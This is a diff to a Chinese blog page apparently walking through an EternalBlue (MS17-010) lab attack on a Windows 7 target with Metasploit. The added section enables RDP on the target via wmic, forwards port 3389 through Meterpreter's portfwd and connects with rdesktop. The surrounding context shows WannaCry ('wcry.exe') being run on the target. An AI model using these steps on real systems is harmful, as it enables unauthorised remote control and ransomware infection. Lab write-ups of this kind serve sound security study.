@@ -109,8 +109,11 @@
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_8.jpg">
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_9.jpg">
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_10.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_11.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_12.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_13.jpg">
 <meta property="article:published_time" content="2020-06-09T07:32:31.000Z">
-<meta property="article:modified_time" content="2020-06-09T15:26:31.753Z">
+<meta property="article:modified_time" content="2020-06-10T05:26:51.590Z">
 <meta property="article:author" content="w1ndy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_0.jpg">
@@ -311,8 +314,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-06-09T23:26:31+08:00">
-                2020-06-09
+              <time title="更新于" itemprop="dateModified" datetime="2020-06-10T13:26:51+08:00">
+                2020-06-10
               </time>
             
           </span>
@@ -408,6 +411,14 @@
 <p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_8.jpg" alt=""><br>用shell命令切换到win7的终端运行该病毒</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wcry.exe</span><br></pre></td></tr></table></figure>
 <p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_9.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_10.jpg" alt=""></p>
+<p>Meterpreter常用命令<br><a href="https://www.cnblogs.com/wjw-zm/p/11688992.html" target="_blank" rel="noopener">https://www.cnblogs.com/wjw-zm/p/11688992.html</a><br><a href="https://www.cnblogs.com/maohai-kdg/p/12915718.html" target="_blank" rel="noopener">https://www.cnblogs.com/maohai-kdg/p/12915718.html</a></p>
+<h3 id="利用rdesktop远程连接靶机桌面"><a href="#利用rdesktop远程连接靶机桌面" class="headerlink" title="利用rdesktop远程连接靶机桌面"></a>利用rdesktop远程连接靶机桌面</h3><p>连接之前需要一个靶机的账户，开启靶机的3389端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">'%COMPUTERNAME%'</span> call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>
+<p>该命令就可开启靶机的3389端口<br>将靶机的3389端口转发到本地的6666端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_11.jpg" alt=""><br>接下来就可以用rdesktop连接靶机了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:6666</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_12.jpg" alt=""><br>连接成功后就会弹出登陆界面<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/EternalBlue/ms17_010_13.jpg" alt=""><br>登陆即可</p>
 
       
     </div>
@@ -570,7 +581,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试靶机是否有永恒之蓝漏洞"><span class="nav-text">测试靶机是否有永恒之蓝漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Metasploit利用永恒之蓝漏洞对靶机进行渗透"><span class="nav-text">使用Metasploit利用永恒之蓝漏洞对靶机进行渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透成功后上传WannaCry勒索软件"><span class="nav-text">渗透成功后上传WannaCry勒索软件</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试靶机是否有永恒之蓝漏洞"><span class="nav-text">测试靶机是否有永恒之蓝漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Metasploit利用永恒之蓝漏洞对靶机进行渗透"><span class="nav-text">使用Metasploit利用永恒之蓝漏洞对靶机进行渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透成功后上传WannaCry勒索软件"><span class="nav-text">渗透成功后上传WannaCry勒索软件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用rdesktop远程连接靶机桌面"><span class="nav-text">利用rdesktop远程连接靶机桌面</span></a></li></ol></div>
             
 
           </div>
